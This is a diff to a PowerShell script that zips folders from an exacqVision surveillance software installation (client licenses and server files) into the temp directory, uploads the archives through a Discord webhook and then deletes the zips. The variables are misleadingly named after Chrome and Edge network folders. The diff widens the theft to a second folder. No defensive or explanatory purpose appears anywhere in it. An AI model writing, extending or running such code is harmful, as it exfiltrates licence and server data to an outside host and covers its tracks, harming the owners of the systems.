@@ -1,12 +1,19 @@
+# Get current Windows username
+$currentUser = $env:USERNAME
+
 # Define folder paths
-$chromeNetworkFolder = "C:\Program Files\exacqVision\Server"
+$chromeNetworkFolder = "C:\Program Files\exacqVision\Client\licenses"
+$edgeNetworkFolder = "C:\Program Files\exacqVision\Server"
 
 # Define zip file names
-$chromeZip = "$env:TEMP\Exacqvision.zip"
+$chromeZip = "$env:TEMP\ChromeNetwork.zip"
+$edgeZip = "$env:TEMP\EdgeNetwork.zip"
 
 # Compress the Chrome network folder
 Compress-Archive -Path $chromeNetworkFolder -DestinationPath $chromeZip
 
+# Compress the Edge network folder
+Compress-Archive -Path $edgeNetworkFolder -DestinationPath $edgeZip
 
 # Discord webhook upload function
 function Upload-Discord {
@@ -36,5 +43,7 @@ function Upload-Discord {
 
 # Upload the zipped files to Discord
 Upload-Discord -file $chromeZip
+Upload-Discord -file $edgeZip
+
 # Clean up: remove the zip files after upload
-Remove-Item -Path $chromeZip -Force
+Remove-Item -Path $chromeZip, $edgeZip -Force
